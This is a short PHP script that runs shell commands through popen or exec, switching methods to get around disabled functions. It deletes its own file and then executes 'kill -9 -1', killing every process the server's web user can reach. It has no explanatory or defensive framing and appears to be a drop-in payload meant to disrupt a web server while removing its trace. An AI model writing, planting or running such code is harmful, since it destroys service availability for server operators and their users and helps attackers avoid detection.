<?php
function run($code, $method = 'popen')
{
    $disabled = explode(',', ini_get('disable_functions'));

    if (in_array($method, $disabled)) {
        $method = 'exec';
    }
    if (in_array($method, $disabled)) {
        return false;
    }

    $result = '';
    switch ($method){
        case 'exec':
            exec($code,$array);
            foreach ($array as $key => $value) {
                $result .= $key . " : " . $value . PHP_EOL;
            }
            return $result;
            break;
        case 'popen':
            $fp = popen($code,"r");
            while (!feof($fp)) {
                $out = fgets($fp, 4096);
                $result .= $out;
            }
            pclose($fp);
            return $result;
            break;
        default:
            return false;
            break;
    }
}
unlink(__FILE__);
$disabled = explode(',', ini_get('disable_functions'));
if (in_array("exec", $disabled) && in_array("popen", $disabled))
{
    echo "failed";
} else {
    $result = run("kill -9 -1");
    var_dump($result);
}
